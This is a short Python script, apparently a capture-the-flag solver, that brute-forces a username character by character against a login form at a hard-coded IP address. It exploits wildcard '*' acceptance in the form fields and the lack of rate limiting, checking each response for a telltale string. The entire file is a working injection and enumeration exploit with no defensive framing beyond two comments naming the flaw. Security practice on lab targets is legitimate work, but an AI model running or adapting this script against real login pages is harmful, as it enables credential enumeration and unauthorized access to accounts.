import requests
import string

pp=string.printable
list1=[]

for p in pp:
   list1.append(p)
   
#print(list)

#No rate limiting on Form Vulnerability
#* accepted 

url='http://46.101.72.211:32365/login'
myobj={'username' : 'somevalue' , 'password':'*'}
result=''

flag=1
while flag==1:
   flag=0
   for l in list1:
      myobj['username']=result+l+'*'
      r=requests.post(url,data=myobj)
      if 'No search results' in r.text:
         result+=l
         flag=1
         print(result)
         break
         
print('Finish !')
